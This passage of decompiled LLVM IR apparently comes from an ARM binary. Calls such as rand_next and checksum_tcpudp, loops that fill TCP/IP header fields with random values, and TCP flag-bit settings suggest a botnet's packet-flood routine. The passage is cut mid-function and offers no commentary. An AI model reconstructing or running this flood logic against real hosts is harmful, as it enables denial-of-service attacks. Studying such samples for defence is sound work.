  store i32 %v5_a4a8, i32* %r2.global-to-local, align 4
  %v1_a4ac = and i32 %v0_a49c, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_a4ac, i32* %r3.global-to-local, align 4
  %v1_a4b0 = add i32 %v2_a4a4, 20
  %v2_a4b0 = inttoptr i32 %v1_a4b0 to i8*
  %v3_a4b0 = load i8, i8* %v2_a4b0, align 1
  %v4_a4b0 = zext i8 %v3_a4b0 to i32
  store i32 %v4_a4b0, i32* %ip.global-to-local, align 4
  %v4_a4b4 = mul i32 %v1_a4ac, 256
  %v4_a4b8 = mul i32 %v0_a49c, 16777216
  %v5_a4b4 = or i32 %v4_a4b4, %v4_a4b8
  %v5_a4b8 = or i32 %v5_a4b4, %v5_a4a8
  %v7_a4bc = lshr i32 %v0_a488, %v4_a4b0
  %v8_a4bc = add i32 %v7_a4bc, %v5_a4b8
  store i32 %v8_a4bc, i32* %r2.global-to-local, align 4
  %v1_a4c0 = and i32 %v8_a4bc, 16711680
  store i32 %v1_a4c0, i32* %r0.global-to-local, align 4
  %v1_a4cc = and i32 %v8_a4bc, 65280
  store i32 %v1_a4cc, i32* %r1.global-to-local, align 4
  %v5_a4d4 = call i32 @llvm.bswap.i32(i32 %v8_a4bc)
  store i32 %v5_a4d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a340

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a340
  %v0_a4e0 = call i32 @rand_next()
  %v1_a4e0 = trunc i32 %v0_a4e0 to i16
  store i32 %v0_a4e0, i32* %r0.global-to-local, align 4
  store i32 %v2_a320, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a364

dec_label_pc_a4f0:                                ; preds = %dec_label_pc_a40c
  %v3_a4f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a4f0, i32* @r4, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v5_a4f8 = mul i32 %v3_a4f0, 16
  %v6_a4f8 = add i32 %v5_a4f8, %v2_a0cc
  %v7_a4f8 = inttoptr i32 %v6_a4f8 to i32*
  store i32 %v0_a4f8, i32* %v7_a4f8, align 4
  %v0_a4fc = load i32, i32* @r8, align 4
  %v1_a4fc = add i32 %v0_a4fc, 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i32*
  %v3_a4fc = load i32, i32* %v2_a4fc, align 4
  store i32 %v3_a4fc, i32* %r1.global-to-local, align 4
  %v3_a504 = udiv i32 %v3_a4fc, 16777216
  %v1_a508 = and i32 %v3_a4fc, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_a508, i32* %r2.global-to-local, align 4
  %v1_a500 = udiv i32 %v3_a4fc, 256
  %v4_a50c = and i32 %v1_a500, 65280
  store i32 %v2_a0cc, i32* %r0.global-to-local, align 4
  %v4_a514 = mul i32 %v1_a508, 256
  %v0_a518 = load i32, i32* @r4, align 4
  %v3_a518 = mul i32 %v0_a518, 16
  %v2_a51c = add i32 %v3_a518, %v2_a0cc
  store i32 %v2_a51c, i32* %ip.global-to-local, align 4
  %v4_a520 = mul i32 %v3_a4fc, 16777216
  %v5_a50c = or i32 %v4_a520, %v3_a504
  %v5_a514 = or i32 %v5_a50c, %v4_a50c
  %v5_a520 = or i32 %v5_a514, %v4_a514
  store i32 %v5_a520, i32* %r3.global-to-local, align 4
  %v2_a524 = add i32 %v2_a51c, 4
  %v3_a524 = inttoptr i32 %v2_a524 to i32*
  store i32 %v5_a520, i32* %v3_a524, align 4
  %v0_a528 = load i32, i32* @r8, align 4
  %v1_a528 = add i32 %v0_a528, 8
  %v2_a528 = inttoptr i32 %v1_a528 to i32*
  %v3_a528 = load i32, i32* %v2_a528, align 4
  store i32 %v3_a528, i32* %r1.global-to-local, align 4
  %v1_a52c = and i32 %v3_a528, 16711680
  store i32 %v1_a52c, i32* %r0.global-to-local, align 4
  %v3_a530 = udiv i32 %v3_a528, 16777216
  %v1_a534 = and i32 %v3_a528, ptrtoint (i32* @global_var_ff00.33 to i32)
  %v4_a538 = udiv i32 %v1_a52c, 256
  %v4_a53c = mul i32 %v1_a534, 256
  store i32 %v6_a250, i32* %r2.global-to-local, align 4
  %v4_a544 = mul i32 %v3_a528, 16777216
  %v5_a538 = or i32 %v4_a544, %v3_a530
  %v5_a53c = or i32 %v5_a538, %v4_a538
  %v5_a544 = or i32 %v5_a53c, %v4_a53c
  store i32 %v5_a544, i32* %r3.global-to-local, align 4
  %v1_a548 = add i32 %v0_a528, 2
  %v2_a548 = inttoptr i32 %v1_a548 to i16*
  %v3_a548 = load i16, i16* %v2_a548, align 2
  %v4_a548 = zext i16 %v3_a548 to i32
  store i32 %v4_a548, i32* %r1.global-to-local, align 4
  store i32 %v1_a54c, i32* @r7, align 4
  %v0_a550 = load i32, i32* @lr, align 4
  %v1_a550 = trunc i32 %v0_a550 to i16
  %v2_a550 = load i32, i32* %ip.global-to-local, align 4
  %v3_a550 = add i32 %v2_a550, 14
  %v4_a550 = inttoptr i32 %v3_a550 to i16*
  store i16 %v1_a550, i16* %v4_a550, align 2
  %v0_a554 = load i32, i32* %r1.global-to-local, align 4
  %v1_a554 = trunc i32 %v0_a554 to i16
  %v2_a554 = load i32, i32* %ip.global-to-local, align 4
  %v3_a554 = add i32 %v2_a554, 12
  %v4_a554 = inttoptr i32 %v3_a554 to i16*
  store i16 %v1_a554, i16* %v4_a554, align 2
  %v0_a558 = load i32, i32* %r3.global-to-local, align 4
  %v1_a558 = load i32, i32* %ip.global-to-local, align 4
  %v2_a558 = add i32 %v1_a558, 8
  %v3_a558 = inttoptr i32 %v2_a558 to i32*
  store i32 %v0_a558, i32* %v3_a558, align 4
  %v0_a55c = load i32, i32* @r7, align 4
  store i32 %v0_a55c, i32* @r0, align 4
  %v0_a560 = call i32 @malloc()
  store i32 %v0_a560, i32* %r0.global-to-local, align 4
  store i32 %v2_a0dc, i32* %r3.global-to-local, align 4
  %v2_a56c = load i32, i32* @r4, align 4
  %v5_a56c = mul i32 %v2_a56c, 4
  %v6_a56c = add i32 %v5_a56c, %v2_a0dc
  %v7_a56c = inttoptr i32 %v6_a56c to i32*
  store i32 %v0_a560, i32* %v7_a56c, align 4
  %v3_a570 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a570, i32* %r2.global-to-local, align 4
  %v0_a574 = load i32, i32* %r3.global-to-local, align 4
  %v4_a574 = mul i32 %v3_a570, 4
  %v5_a574 = add i32 %v0_a574, %v4_a574
  %v6_a574 = inttoptr i32 %v5_a574 to i32*
  %v7_a574 = load i32, i32* %v6_a574, align 4
  store i32 %v7_a574, i32* @r4, align 4
  %v1_a578 = inttoptr i32 %v7_a574 to i8*
  %v2_a578 = load i8, i8* %v1_a578, align 1
  %tmp103 = urem i8 %v2_a578, 16
  %v1_a57c = zext i8 %tmp103 to i32
  %v1_a580 = or i32 %v1_a57c, 64
  store i32 %v1_a580, i32* %r3.global-to-local, align 4
  %v1_a584 = trunc i32 %v1_a580 to i8
  store i8 %v1_a584, i8* %v1_a578, align 1
  %v0_a588 = load i32, i32* @r4, align 4
  %v1_a588 = inttoptr i32 %v0_a588 to i8*
  %v2_a588 = load i8, i8* %v1_a588, align 1
  %v0_a58c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_a58c, 256
  %v1_a594 = and i8 %v2_a588, -16
  %v1_a598 = or i8 %v1_a594, 5
  %v1_a59c = and i32 %tmp77, and (i32 ptrtoint (i32* @global_var_ff00.33 to i32), i32 16776960)
  %tmp78 = udiv i32 %v0_a58c, 256
  %v4_a5a0 = urem i32 %tmp78, 256
  %v5_a5a0 = or i32 %v4_a5a0, %v1_a59c
  store i32 %v5_a5a0, i32* %r2.global-to-local, align 4
  %v0_a5a4 = load i32, i32* @fp, align 4
  %v1_a5a4 = urem i32 %v0_a5a4, 256
  store i32 %v1_a5a4, i32* %r0.global-to-local, align 4
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  %v3_a5ac = udiv i32 %v0_a5a4, 256
  store i32 %v3_a5ac, i32* %r1.global-to-local, align 4
  store i8 %v1_a598, i8* %v1_a588, align 1
  %v0_a5b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5b4 = load i32, i32* %r0.global-to-local, align 4
  %v4_a5b4 = mul i32 %v1_a5b4, 256
  %v5_a5b4 = or i32 %v4_a5b4, %v0_a5b4
  store i32 %v5_a5b4, i32* %r1.global-to-local, align 4
  store i32 %v6_a0f4, i32* %r0.global-to-local, align 4
  %v2_a5bc = load i32, i32* @r4, align 4
  %v3_a5bc = add i32 %v2_a5bc, 1
  %v4_a5bc = inttoptr i32 %v3_a5bc to i8*
  store i8 %v5_a114, i8* %v4_a5bc, align 1
  %v0_a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5c0 = trunc i32 %v0_a5c0 to i16
  %v2_a5c0 = load i32, i32* @r4, align 4
  %v3_a5c0 = add i32 %v2_a5c0, 4
  %v4_a5c0 = inttoptr i32 %v3_a5c0 to i16*
  store i16 %v1_a5c0, i16* %v4_a5c0, align 2
  %v0_a5c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_a5c4 = icmp eq i32 %v0_a5c4, 0
  store i1 %v2_a5c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a150, i32* %r1.global-to-local, align 4
  %v0_a5cc = load i32, i32* %r2.global-to-local, align 4
  %v1_a5cc = trunc i32 %v0_a5cc to i16
  %v2_a5cc = load i32, i32* @r4, align 4
  %v3_a5cc = add i32 %v2_a5cc, 2
  %v4_a5cc = inttoptr i32 %v3_a5cc to i16*
  store i16 %v1_a5cc, i16* %v4_a5cc, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_a5c4, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_a4f0
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_a4f0, %bb79
  %v0_a5d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5d8 = trunc i32 %v0_a5d8 to i8
  %v2_a5d8 = load i32, i32* @r4, align 4
  %v3_a5d8 = add i32 %v2_a5d8, 8
  %v4_a5d8 = inttoptr i32 %v3_a5d8 to i8*
  store i8 %v1_a5d8, i8* %v4_a5d8, align 1
  %v0_a5dc = load i32, i32* %r3.global-to-local, align 4
  %v1_a5dc = trunc i32 %v0_a5dc to i8
  %v2_a5dc = load i32, i32* @r4, align 4
  %v3_a5dc = add i32 %v2_a5dc, 9
  %v4_a5dc = inttoptr i32 %v3_a5dc to i8*
  store i8 %v1_a5dc, i8* %v4_a5dc, align 1
  %v0_a5e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a5e0, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_a5e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a5e0 = trunc i32 %v1_a5e0 to i16
  %v3_a5e0 = load i32, i32* @r4, align 4
  %v4_a5e0 = add i32 %v3_a5e0, 6
  %v5_a5e0 = inttoptr i32 %v4_a5e0 to i16*
  store i16 %v2_a5e0, i16* %v5_a5e0, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_24f40.59 to i32), i32* %r2.global-to-local, align 4
  %v2_a5e8 = load i32, i32* @global_var_24f40.59, align 4
  store i32 %v2_a5e8, i32* %r1.global-to-local, align 4
  %v1_a5ec = load i32, i32* @r4, align 4
  %v2_a5ec = add i32 %v1_a5ec, 12
  %v3_a5ec = inttoptr i32 %v2_a5ec to i32*
  store i32 %v2_a5e8, i32* %v3_a5ec, align 4
  %v3_a5f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a5f0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v4_a5f8 = mul i32 %v3_a5f0, 16
  %v5_a5f8 = add i32 %v4_a5f8, %v2_a0cc
  %v6_a5f8 = inttoptr i32 %v5_a5f8 to i32*
  %v7_a5f8 = load i32, i32* %v6_a5f8, align 4
  store i32 %v7_a5f8, i32* %r2.global-to-local, align 4
  store i32 %v5_a5f8, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r4, align 4
  %v2_a604 = add i32 %v1_a604, 16
  %v3_a604 = inttoptr i32 %v2_a604 to i32*
  store i32 %v7_a5f8, i32* %v3_a604, align 4
  %v0_a608 = load i32, i32* %r3.global-to-local, align 4
  %v1_a608 = add i32 %v0_a608, 12
  %v2_a608 = inttoptr i32 %v1_a608 to i16*
  %v3_a608 = load i16, i16* %v2_a608, align 2
  %v4_a608 = zext i16 %v3_a608 to i32
  store i32 %v4_a608, i32* %r0.global-to-local, align 4
  %v1_a60c = add i32 %v0_a608, 8
  %v2_a60c = inttoptr i32 %v1_a60c to i32*
  %v3_a60c = load i32, i32* %v2_a60c, align 4
  store i32 %v3_a60c, i32* %r1.global-to-local, align 4
  %v2_a610 = load i32, i32* @r4, align 4
  %v3_a610 = add i32 %v2_a610, 20
  %v4_a610 = inttoptr i32 %v3_a610 to i16*
  store i16 %v3_a608, i16* %v4_a610, align 2
  %v0_a614 = load i32, i32* @r4, align 4
  %v1_a614 = add i32 %v0_a614, 20
  store i32 %v1_a614, i32* @r8, align 4
  %v1_a618 = add i32 %v0_a614, 33
  %v2_a618 = inttoptr i32 %v1_a618 to i8*
  %v3_a618 = load i8, i8* %v2_a618, align 1
  %v4_a618 = zext i8 %v3_a618 to i32
  store i32 %v4_a618, i32* %r2.global-to-local, align 4
  %v0_a61c = load i32, i32* %r1.global-to-local, align 4
  %v2_a61c = add i32 %v0_a614, 24
  %v3_a61c = inttoptr i32 %v2_a61c to i32*
  store i32 %v0_a61c, i32* %v3_a61c, align 4
  %v0_a620 = load i32, i32* %r2.global-to-local, align 4
  %v1_a620 = or i32 %v0_a620, 1
  store i32 %v1_a620, i32* %r2.global-to-local, align 4
  %v0_a624 = load i32, i32* %r3.global-to-local, align 4
  %v1_a624 = add i32 %v0_a624, 4
  %v2_a624 = inttoptr i32 %v1_a624 to i32*
  %v3_a624 = load i32, i32* %v2_a624, align 4
  store i32 %v3_a624, i32* %r1.global-to-local, align 4
  %v1_a628 = add i32 %v0_a624, 14
  %v2_a628 = inttoptr i32 %v1_a628 to i16*
  %v3_a628 = load i16, i16* %v2_a628, align 2
  %v4_a628 = zext i16 %v3_a628 to i32
  store i32 %v4_a628, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v1_a620 to i8
  %v2_a62c = load i32, i32* @r8, align 4
  %v3_a62c = add i32 %v2_a62c, 13
  %v4_a62c = inttoptr i32 %v3_a62c to i8*
  store i8 %v1_a62c, i8* %v4_a62c, align 1
  %v0_a630 = load i32, i32* %r3.global-to-local, align 4
  %v1_a630 = trunc i32 %v0_a630 to i16
  %v2_a630 = load i32, i32* @r8, align 4
  %v3_a630 = add i32 %v2_a630, 2
  %v4_a630 = inttoptr i32 %v3_a630 to i16*
  store i16 %v1_a630, i16* %v4_a630, align 2
  %v0_a634 = load i32, i32* @r8, align 4
  %v1_a634 = add i32 %v0_a634, 12
  %v2_a634 = inttoptr i32 %v1_a634 to i8*
  %v3_a634 = load i8, i8* %v2_a634, align 1
  %v4_a634 = zext i8 %v3_a634 to i32
  store i32 %v4_a634, i32* %r3.global-to-local, align 4
  %v1_a638 = add i32 %v0_a634, 13
  %v2_a638 = inttoptr i32 %v1_a638 to i8*
  %v3_a638 = load i8, i8* %v2_a638, align 1
  %v4_a638 = zext i8 %v3_a638 to i32
  %tmp104 = urem i8 %v3_a634, 16
  %v1_a63c = zext i8 %tmp104 to i32
  %v1_a640 = or i32 %v1_a63c, 128
  store i32 %v1_a640, i32* %r3.global-to-local, align 4
  %v1_a644 = or i32 %v4_a638, 16
  store i32 %v1_a644, i32* %r2.global-to-local, align 4
  %v0_a648 = load i32, i32* %r1.global-to-local, align 4
  %v2_a648 = add i32 %v0_a634, 8
  %v3_a648 = inttoptr i32 %v2_a648 to i32*
  store i32 %v0_a648, i32* %v3_a648, align 4
  %v0_a64c = load i32, i32* %r3.global-to-local, align 4
  %v1_a64c = trunc i32 %v0_a64c to i8
  %v2_a64c = load i32, i32* @r8, align 4
  %v3_a64c = add i32 %v2_a64c, 12
  %v4_a64c = inttoptr i32 %v3_a64c to i8*
  store i8 %v1_a64c, i8* %v4_a64c, align 1
  %v0_a650 = load i32, i32* %r2.global-to-local, align 4
  %v1_a650 = trunc i32 %v0_a650 to i8
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, 13
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 %v1_a650, i8* %v4_a650, align 1
  %v0_a654 = call i32 @rand_next()
  %v1_a654 = trunc i32 %v0_a654 to i16
  store i32 %v0_a654, i32* %r0.global-to-local, align 4
  store i32 %v1_a198, i32* %r1.global-to-local, align 4
  %v0_a65c = load i32, i32* @r8, align 4
  %v1_a65c = add i32 %v0_a65c, 13
  %v2_a65c = inttoptr i32 %v1_a65c to i8*
  %v3_a65c = load i8, i8* %v2_a65c, align 1
  %v4_a65c = zext i8 %v3_a65c to i32
  store i32 %v1_a660, i32* %r2.global-to-local, align 4
  %v1_a664 = and i32 %v4_a65c, 223
  %v5_a668 = or i32 %v1_a664, %v4_a668
  store i32 %v5_a668, i32* %r3.global-to-local, align 4
  %v1_a66c = trunc i32 %v5_a668 to i8
  store i8 %v1_a66c, i8* %v2_a65c, align 1
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a674 = load i32, i32* @r8, align 4
  %v1_a674 = add i32 %v0_a674, 13
  %v2_a674 = inttoptr i32 %v1_a674 to i8*
  %v3_a674 = load i8, i8* %v2_a674, align 1
  %v4_a674 = zext i8 %v3_a674 to i32
  store i32 %v1_a678, i32* %r3.global-to-local, align 4
  %v1_a67c = and i32 %v4_a674, 239
  %v5_a680 = or i32 %v1_a67c, %v4_a680
  store i32 %v5_a680, i32* %r2.global-to-local, align 4
  %v1_a684 = trunc i32 %v5_a680 to i8
  store i8 %v1_a684, i8* %v2_a674, align 1
  store i32 %v1_a1d8, i32* %r1.global-to-local, align 4
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, 13
  %v2_a68c = inttoptr i32 %v1_a68c to i8*
  %v3_a68c = load i8, i8* %v2_a68c, align 1
  %v4_a68c = zext i8 %v3_a68c to i32
  store i32 %v1_a690, i32* %r2.global-to-local, align 4
  %v1_a694 = and i32 %v4_a68c, 247
  %v5_a698 = or i32 %v1_a694, %v4_a698
  store i32 %v5_a698, i32* %r3.global-to-local, align 4
  %v1_a69c = trunc i32 %v5_a698 to i8
  store i8 %v1_a69c, i8* %v2_a68c, align 1
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a6a4 = load i32, i32* @r8, align 4
  %v1_a6a4 = add i32 %v0_a6a4, 13
  %v2_a6a4 = inttoptr i32 %v1_a6a4 to i8*
  %v3_a6a4 = load i8, i8* %v2_a6a4, align 1
  %v4_a6a4 = zext i8 %v3_a6a4 to i32
  store i32 %v1_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = and i32 %v4_a6a4, 251
  %v5_a6b0 = or i32 %v1_a6ac, %v4_a6b0
  store i32 %v5_a6b0, i32* %r2.global-to-local, align 4
  %v1_a6b4 = trunc i32 %v5_a6b0 to i8
  store i8 %v1_a6b4, i8* %v2_a6a4, align 1
  store i32 %v1_a218, i32* %r1.global-to-local, align 4
  %v0_a6bc = load i32, i32* @r8, align 4
  %v1_a6bc = add i32 %v0_a6bc, 13
  %v2_a6bc = inttoptr i32 %v1_a6bc to i8*
  %v3_a6bc = load i8, i8* %v2_a6bc, align 1
  %v4_a6bc = zext i8 %v3_a6bc to i32
  store i32 %v1_a6c0, i32* %r2.global-to-local, align 4
  %v1_a6c4 = and i32 %v4_a6bc, 253
  %v4_a6c8 = or i32 %v1_a6c4, %v3_a6c8
  store i32 %v4_a6c8, i32* %r3.global-to-local, align 4
  %v1_a6cc = trunc i32 %v4_a6c8 to i8
  store i8 %v1_a6cc, i8* %v2_a6bc, align 1
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  %v0_a6d4 = load i32, i32* @r8, align 4
  %v1_a6d4 = add i32 %v0_a6d4, 13
  %v2_a6d4 = inttoptr i32 %v1_a6d4 to i8*
  %v3_a6d4 = load i8, i8* %v2_a6d4, align 1
  %v4_a6d4 = zext i8 %v3_a6d4 to i32
  %v1_a6dc = and i32 %v4_a6d4, 254
  store i32 %v1_a6dc, i32* %r2.global-to-local, align 4
  %v2_a6e0 = or i32 %v1_a6dc, %v1_a6d8
  store i32 %v2_a6e0, i32* %r3.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v2_a6e0 to i8
  store i8 %v1_a6e4, i8* %v2_a6d4, align 1
  %v3_a6e8 = load i32, i32* @r8, align 4
  %v4_a6e8 = add i32 %v3_a6e8, 14
  %v5_a6e8 = inttoptr i32 %v4_a6e8 to i16*
  store i16 %v1_a654, i16* %v5_a6e8, align 2
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r4, align 4
  %v1_a6f0 = add i32 %v0_a6f0, 40
  store i32 %v1_a6f0, i32* %r0.global-to-local, align 4
  %v2_a6f4 = inttoptr i32 %v1_a6f0 to i16*
  %v3_a6f4 = call i32 @rand_str(i16* %v2_a6f4, i32 %v6_a250)
  store i32 %v3_a6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a448

dec_label_pc_a6fc:                                ; preds = %dec_label_pc_a2bc
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_a250, 40
  br label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a45c, %dec_label_pc_a6fc
  %storemerge6.pre-phi = phi i32 [ %v1_a54c, %dec_label_pc_a45c ], [ %.pre, %dec_label_pc_a6fc ]
  %v0_a72026 = phi i32 [ %v1_a450, %dec_label_pc_a45c ], [ 0, %dec_label_pc_a6fc ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_a250, 65536
  %storemerge = add i32 %v6_a250, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_a70c = add i32 %storemerge4, 1310720
  store i32 %v1_a70c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_a70c, 256
  %v3_a714 = and i32 %tmp83, 65280
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  %v4_a718 = udiv i32 %v1_a70c, 16777216
  %v5_a718 = or i32 %v3_a714, %v4_a718
  store i32 %v5_a718, i32* @r8, align 4
  %v2_a844 = icmp eq i32 %v1_a270, 0
  br label %dec_label_pc_a71c

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828, %dec_label_pc_a70c
  %v0_a720 = phi i32 [ %v0_a72026, %dec_label_pc_a70c ], [ 0, %dec_label_pc_a828 ], [ 0, %dec_label_pc_a71c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a720 = icmp eq i32 %v0_a720, 0
  store i1 %v2_a720, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a720, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a730

dec_label_pc_a730:                                ; preds = %dec_label_pc_a758, %dec_label_pc_a72c
  %v1_a738 = phi i32 [ %v1_a818, %dec_label_pc_a758 ], [ 0, %dec_label_pc_a72c ]
  store i32 %v2_a0dc, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_a738 = mul i32 %v1_a738, 4
  %v5_a738 = add i32 %v4_a738, %v2_a0dc
  %v6_a738 = inttoptr i32 %v5_a738 to i32*
  %v7_a738 = load i32, i32* %v6_a738, align 4
  store i32 %v7_a738, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a740 = load i32, i32* @fp, align 4
  %v9_a740 = icmp eq i32 %v0_a740, 65535
  store i1 %v9_a740, i1* %cpsr_z.global-to-local, align 1
  %v1_a744 = add i32 %v7_a738, 20
  store i32 %v1_a744, i32* @r5, align 4
  br i1 %v9_a740, label %dec_label_pc_a83c, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a730
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a850

dec_label_pc_a758:                                ; preds = %dec_label_pc_a74c, %dec_label_pc_a83c, %dec_label_pc_a850
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a75c = load i32, i32* @r4, align 4
  %v3_a75c = add i32 %v2_a75c, 10
  %v4_a75c = inttoptr i32 %v3_a75c to i16*
  store i16 0, i16* %v4_a75c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a764 = load i32, i32* @r4, align 4
  store i32 %v0_a764, i32* @r0, align 4
  %v2_a768 = call i32 @checksum_generic(i32 %v0_a764, i32 20)
  %v3_a768 = trunc i32 %v2_a768 to i16
  store i32 %v2_a768, i32* %r0.global-to-local, align 4
  %v3_a76c = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_a0cc, i32* %r2.global-to-local, align 4
  %v3_a774 = mul i32 %v3_a76c, 16
  %v2_a778 = add i32 %v3_a774, %v2_a0cc
  store i32 %v2_a778, i32* %r1.global-to-local, align 4
  %v1_a77c = add i32 %v2_a778, 4
  %v2_a77c = inttoptr i32 %v1_a77c to i32*
  %v3_a77c = load i32, i32* %v2_a77c, align 4
  %v3_a780 = mul i32 %v3_a77c, 65536
  store i32 %v3_a780, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_a77c, 256
  %v1_a788 = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.33 to i32), i32 16776960)
  %tmp86 = udiv i32 %v3_a77c, 256
  %v4_a78c = urem i32 %tmp86, 256
  %v5_a78c = or i32 %v4_a78c, %v1_a788
  store i32 %v5_a78c, i32* %r3.global-to-local, align 4
  %v1_a790 = add i32 %v3_a77c, 1
  store i32 %v1_a790, i32* %r2.global-to-local, align 4
  store i32 %v1_a790, i32* %v2_a77c, align 4
  %v0_a798 = load i32, i32* %r3.global-to-local, align 4
  %v1_a798 = load i32, i32* @r5, align 4
  %v2_a798 = add i32 %v1_a798, 4
  %v3_a798 = inttoptr i32 %v2_a798 to i32*
  store i32 %v0_a798, i32* %v3_a798, align 4
  %v0_a79c = load i32, i32* %r1.global-to-local, align 4
  %v1_a79c = add i32 %v0_a79c, 8
  %v2_a79c = inttoptr i32 %v1_a79c to i32*
  %v3_a79c = load i32, i32* %v2_a79c, align 4
  %tmp87 = mul i32 %v3_a79c, 256
  %v1_a7a8 = and i32 %tmp87, and (i32 ptrtoint (i32* @global_var_ff00.33 to i32), i32 16776960)
  %tmp88 = udiv i32 %v3_a79c, 256
  %v4_a7ac = urem i32 %tmp88, 256
  %v5_a7ac = or i32 %v4_a7ac, %v1_a7a8
  %v1_a7b0 = load i32, i32* @r5, align 4
  %v2_a7b0 = add i32 %v1_a7b0, 8
  %v3_a7b0 = inttoptr i32 %v2_a7b0 to i32*
  store i32 %v5_a7ac, i32* %v3_a7b0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a7b8 = load i32, i32* @r4, align 4
  %v4_a7b8 = add i32 %v3_a7b8, 10
  %v5_a7b8 = inttoptr i32 %v4_a7b8 to i16*
  store i16 %v3_a768, i16* %v5_a7b8, align 2
  %v0_a7bc = load i32, i32* @r5, align 4
  store i32 %v0_a7bc, i32* @r1, align 4
  %v0_a7c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7c0 = trunc i32 %v0_a7c0 to i16
  %v3_a7c0 = add i32 %v0_a7bc, 16
  %v4_a7c0 = inttoptr i32 %v3_a7c0 to i16*
  store i16 %v1_a7c0, i16* %v4_a7c0, align 2
  %v0_a7c4 = load i32, i32* @r8, align 4
  store i32 %v0_a7c4, i32* %r2.global-to-local, align 4
  %v0_a7c8 = load i32, i32* @sl, align 4
  store i32 %v0_a7c8, i32* %r3.global-to-local, align 4
  %v0_a7cc = load i32, i32* @r4, align 4
  store i32 %v0_a7cc, i32* %r0.global-to-local, align 4
  %v4_a7d0 = call i32 @checksum_tcpudp(i32 %v0_a7cc, i32 %v0_a7bc, i32 %v0_a7c4, i32 %v0_a7c8)
  %v5_a7d0 = trunc i32 %v4_a7d0 to i16
  store i32 %v4_a7d0, i32* %r0.global-to-local, align 4
  %v3_a7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a7d4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a7dc = mul i32 %v3_a7d4, 32
  store i32 %v3_a7dc, i32* %lr.global-to-local, align 4
  %v3_a7e0 = load i32, i32* @r5, align 4
  %v4_a7e0 = add i32 %v3_a7e0, 16
  %v5_a7e0 = inttoptr i32 %v4_a7e0 to i16*
  store i16 %v5_a7d0, i16* %v5_a7e0, align 2
  %v0_a7e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_a7e4 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_a7e4, -8
  %v5_a7e4 = add i32 %v0_a7e4, %tmp105
  store i32 %v5_a7e4, i32* %lr.global-to-local, align 4
  %v0_a7e8 = load i32, i32* @r5, align 4
  %v1_a7e8 = add i32 %v0_a7e8, 2
